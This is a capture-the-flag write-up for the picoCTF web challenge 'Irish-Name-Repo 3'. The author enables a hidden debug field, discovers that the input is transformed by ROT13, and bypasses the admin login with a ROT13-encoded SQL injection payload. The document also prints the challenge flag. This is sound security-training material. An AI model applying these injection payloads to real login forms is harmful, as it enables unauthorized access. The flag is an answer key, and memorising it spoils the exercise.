# PicoCTF - Irish-Name-Repo 3 (Web exploitation)

## Description
There is a secure website running at https://jupiter.challenges.picoctf.org/problem/54253/ (link) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!

## Provided
None

## Initial Attempts

### 1. Trying admin login
Initially, I went to the admin login page where the password input is located. I tried simple inputs such as `123` and `admin`. However, the output was always:
   ```bash
   Login failed.
   ```
   So I knew the form was working, but I could not tell how my input was being used.

### 2. Finding debug line
   While I was carefully looking at `login.html`, I found this line:
   ```bash
   <input type="hidden" name="debug" value="0">
   ```
   This seems to be a debugging mode with value set to `0`. I tried:
   ```bash
    <input type="hidden" name="debug" value="1">
   ```
   and submitted `123` as the password. The output was:
   ```bash
   password: 123
    SQL query: SELECT * FROM admin where password = '123'
    Login failed.
   ```
   This revealed exactly how my input was being used inside the SQL query.

### 3. Attempting SQL Injection
   With debug output enabled, I realized this was likely an SQL injection challenge. I tried the classic payload:
   ```bash
   ` OR 1=1 --
   ```
   This should generate:
   ```bash
   SELECT * FROM admin where password = '' OR 1=1 --'
   ```
   This query would normally return all rows since 1=1 is always true.
   ```bash
   password: ' OR 1=1 --
    SQL query: SELECT * FROM admin where password = '' BE 1=1 --'
   ```
  At this moment I had no idea why it failed. Later I noticed that the server was replacing the keyword OR with BE, which is a form of input filtering. Because of this, my injection attempt did not work as intended.

## Solution (after reading the write-up)

1. Understanding the encoding
   Since the query was modifying the password input before execution, I needed to identify what type of encoding was being
   applied.
   I used dcode.fr cipher identifier with the suspicious part:
   ```bash
      Be 1=1 --
   ```
   I received:
   ```bash
   _Warning_ The text has a **short length**, this can affect the quantity and reliability of the results
   ```
   So I tried longer phrase:
   ```bash
   Hi Im Akira from Japan and I love sushi.
   ```
   output:
   ```bash
   password:  Hi Im Akira from Japan and I love sushi.
   SQL query: SELECT * FROM admin where password = ' Uv Vz Nxven sebz Wncna naq V ybir fhfuv.'
   ```
   then I used decode.fr cipher identifier and The tool returned ROT13 as the most likely candidate. To confirm it, I decoded    `Uv Vz Nxven sebz Wncna naq V ybir fhfuv`, and the tool gave me exactly same sentence I put.
2. Exploitation
   Knowing that ROT13 was being used, I simply needed to encode my SQL injection payload with ROT13 before submitting it.
   Original payload:
   ```
   ' OR 1=1 --
   ```
   ROT13-encoded payload:
   ```
   ' BE 1=1 --
   ```
   when the serve applied ROT13 again, this was decoded back to:
   ```
   ' OR 1=1 --
   ```
   As a result, the final SQL query executed by the database was:
   ```
   SELECT * FROM admin WHERE password = '' OR 1=1 --'
   ```
   This condition is always true, so the query returned:
   ```
   password: ' BE 1=1 --
   SQL query: SELECT * FROM admin where password = '' OR 1=1 --'
   Logged in!
   Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}
   ```
## Flag
   ```
    picoCTF{3v3n_m0r3_SQL_7f5767f6}
   ```
## Key Idea

- Debug mode provided a clear view of how inputs were being embedded into SQL queries.

- The query was not “encrypted” but simply encoded with ROT13.

- When direct injection fails, always consider if input is being transformed (filtered, sanitized, or encoded).

- In this challenge, the key was to encode the SQL injection payload with ROT13 before sending it.

## Reference

https://mh4ck3r0n3.github.io/posts/2025/03/01/irish-name-repo-3/
